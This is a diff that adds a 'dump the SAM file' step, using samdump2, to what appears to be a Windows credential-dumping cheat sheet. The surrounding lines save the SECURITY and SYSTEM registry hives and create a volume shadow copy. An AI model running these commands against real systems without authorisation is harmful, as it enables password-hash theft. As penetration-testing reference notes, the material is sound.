@@ -137,6 +137,11 @@ reg save HKLM\SECURITY 'C:\Windows\Temp\security.save'
 reg save HKLM\SYSTEM 'C:\Windows\Temp\system.save'
 ```
 
+## dump the SAM file
+```
+samdump2 <SYSTEM> <SAM>
+```
+
 ## create shadow copy
 ```
 wmic shadowcopy call create Volume='C:\'
